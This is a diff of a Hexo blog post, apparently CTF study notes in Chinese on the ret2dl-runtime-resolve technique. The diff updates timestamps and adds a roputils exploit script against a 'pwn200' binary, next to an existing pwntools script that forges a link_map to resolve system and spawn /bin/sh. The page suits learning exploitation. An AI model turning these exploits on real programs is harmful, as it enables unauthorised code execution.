@@ -29,7 +29,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2021/09/06/ret2-reslove/ABf1ag-blog/source_posts/ret2-reslove/image-20210906094913872.png">
 <meta property="article:published_time" content="2021-09-06T01:18:52.000Z">
-<meta property="article:modified_time" content="2021-09-07T14:14:12.977Z">
+<meta property="article:modified_time" content="2021-09-08T07:51:29.121Z">
 <meta property="article:author" content="ABf1ag">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2021/09/06/ret2-reslove/ABf1ag-blog/source_posts/ret2-reslove/image-20210906094913872.png">
@@ -187,7 +187,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-09-07 22:14:12" itemprop="dateModified" datetime="2021-09-07T22:14:12+08:00">2021-09-07</time>
+                <time title="Modified: 2021-09-08 15:51:29" itemprop="dateModified" datetime="2021-09-08T15:51:29+08:00">2021-09-08</time>
               </span>
 
           
@@ -256,12 +256,14 @@ io.interactive()
 <p>sh.sendline(payload)<br>raw_input()<br>#真正的dynstr的地址<br>dynstr = 0x400318<br>#我们准备把link_map放置在bss+0x100处<br>fake_link_map_addr = bss + 0x100<br>#假的dyn_strtab<br>fake_dyn_strtab_addr = fake_link_map_addr + 0x8<br>fake_dyn_strtab = p64(0) + p64(dynstr) #fake_link_map_addr + 0x8<br>#假的dyn_symtab，我们要让对应的dynsym里的st_value指向一个已经解析过的函数的got表<br>#其他字段无关紧要，所以，我们让dynsym为read_got - 0x8，这样，相当于把read_got - 0x8处开始当做一个dynsym，这样st_value正好对应了read的地址<br>#并且(*(sym+5))&amp;0x03 != 0也成立<br>fake_dyn_symtab_addr = fake_link_map_addr + 0x18<br>fake_dyn_symtab = p64(0) + p64(read_got - 0x8) #fake_link_map_addr + 0x18<br>#假的dyn_rel<br>fake_dyn_rel_addr = fake_link_map_addr + 0x28<br>fake_dyn_rel = p64(0) + p64(fake_link_map_addr + 0x38) #fake_link_map_addr + 0x28<br>#假的rel.plt<br>fake_rel = p64(r_offset) + p64(0x7) + p64(0) #fake_link_map_addr + 0x38<br>#l_addr<br>fake_link_map = p64(l_addr)<br>#由于link_map的中间部分在我们的攻击中无关紧要，所以我们把伪造的几个数据结构也放当中<br>fake_link_map += fake_dyn_strtab<br>fake_link_map += fake_dyn_symtab<br>fake_link_map += fake_dyn_rel<br>fake_link_map += fake_rel<br>fake_link_map = fake_link_map.ljust(0x68,’\x00’)<br>#dyn_strtab的指针<br>fake_link_map += p64(fake_dyn_strtab_addr)<br>#dyn_strsym的指针<br>fake_link_map += p64(fake_dyn_symtab_addr) #fake_link_map_addr + 0x70<br>#存入/bin/sh字符串<br>fake_link_map += ‘/bin/sh’.ljust(0x80,’\x00’)<br>#在fake_link_map_addr + 0xF8处，是rel.plt指针<br>fake_link_map += p64(fake_dyn_rel_addr)  </p>
 <p>sh.sendline(fake_link_map)<br>#sleep(1)<br>raw_input()<br>gdb.attach(sh)<br>#现在，我们伪造好了link_map，那么，我们就可以来解析system了<br>rop = ‘A’*0x28 + p64(pop_rdi) + p64(fake_link_map_addr + 0x78)  + p64(plt_load) + p64(fake_link_map_addr) + p64(0)<br>sh.sendline(rop)  </p>
 <p>sh.interactive() </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**4.full relro**</span><br><span class="line"></span><br><span class="line"> 程序在运行之前就已经调用了ld.so将所需的外部函数加载完成，程序运行期间不再动态加载，因此，在程序的got表中，link_map和dl_runtime_resolve函数的地址都为0，因为后续不再使用，没有必要。 </span><br><span class="line"></span><br><span class="line">因此在FULL_RELRO的情况下，要想利用ret2dl-runtime-resolve技术，就只能在栈中低位覆盖数据一定几率恢复出dl_runtime_resolve。</span><br><span class="line"></span><br><span class="line">比如在glibc2.27下，我们低位覆盖这个数据，有很大几率指向dl_runtime_resolve函数的地址，然后，link_map我们可以在我们可控的地方伪造。</span><br><span class="line"></span><br><span class="line">这里，介绍一种其他的方法来针对FULL_RELRO的方案来getshell，那就是低位覆盖栈中数据一定几率指向syscall，构造execve(“/bin/sh”,0,0)系统调用。要构造这样的ROP，其他gadget容易搞定，关键是edx必须为0，不然调用会出错，然而，pop edx或pop rdx这样的gadget基本没有，因此，我们可以ret2csu，来控制edx。</span><br><span class="line"></span><br><span class="line">**工具自动化生成**</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>from roputils import *<br>from pwn import process<br>from pwn import gdb<br>from pwn import context<br>r = process(‘./pwn200’)<br>context.log_level = ‘debug’<br>r.recv()</p>
+<p>rop = ROP(‘./pwn200’)<br>offset = 112<br>bss_base = rop.section(‘.bss’)+0x500<br>buf = rop.fill(offset)</p>
+<p>buf += rop.call(‘read’, 0, bss_base, 100)</p>
+<h2 id="used-to-call-dl-Resolve"><a href="#used-to-call-dl-Resolve" class="headerlink" title="used to call dl_Resolve()"></a>used to call dl_Resolve()</h2><p>buf += rop.dl_resolve_call(bss_base + 40, bss_base)<br>r.send(buf)</p>
+<p>buf = rop.string(‘/bin/sh’)<br>buf += rop.fill(40, buf)</p>
+<h2 id="used-to-make-faking-data-such-relocation-Symbol-Str"><a href="#used-to-make-faking-data-such-relocation-Symbol-Str" class="headerlink" title="used to make faking data, such relocation, Symbol, Str"></a>used to make faking data, such relocation, Symbol, Str</h2><p>buf += rop.dl_resolve_data(bss_base + 40, ‘system’)<br>buf += rop.fill(100, buf)<br>r.send(buf)<br>r.interactive()</p>
 <p>```</p>
-<p><strong>4.full relro</strong></p>
-<p> 程序在运行之前就已经调用了ld.so将所需的外部函数加载完成，程序运行期间不再动态加载，因此，在程序的got表中，link_map和dl_runtime_resolve函数的地址都为0，因为后续不再使用，没有必要。 </p>
-<p>因此在FULL_RELRO的情况下，要想利用ret2dl-runtime-resolve技术，就只能在栈中低位覆盖数据一定几率恢复出dl_runtime_resolve。</p>
-<p>比如在glibc2.27下，我们低位覆盖这个数据，有很大几率指向dl_runtime_resolve函数的地址，然后，link_map我们可以在我们可控的地方伪造。</p>
-<p>这里，介绍一种其他的方法来针对FULL_RELRO的方案来getshell，那就是低位覆盖栈中数据一定几率指向syscall，构造execve(“/bin/sh”,0,0)系统调用。要构造这样的ROP，其他gadget容易搞定，关键是edx必须为0，不然调用会出错，然而，pop edx或pop rdx这样的gadget基本没有，因此，我们可以ret2csu，来控制edx。</p>
 <p><strong>参考</strong></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104478081">https://blog.csdn.net/seaaseesa/article/details/104478081</a></p>
 
@@ -344,7 +346,7 @@ io.interactive()
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2-reslove%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-number">1.</span> <span class="nav-text">ret2_reslove学习笔记</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2-reslove%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0"><span class="nav-number">1.</span> <span class="nav-text">ret2_reslove学习笔记</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#used-to-call-dl-Resolve"><span class="nav-number"></span> <span class="nav-text">used to call dl_Resolve()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#used-to-make-faking-data-such-relocation-Symbol-Str"><span class="nav-number"></span> <span class="nav-text">used to make faking data, such relocation, Symbol, Str</span></a></div>
       </div>
       <!--/noindex-->
 
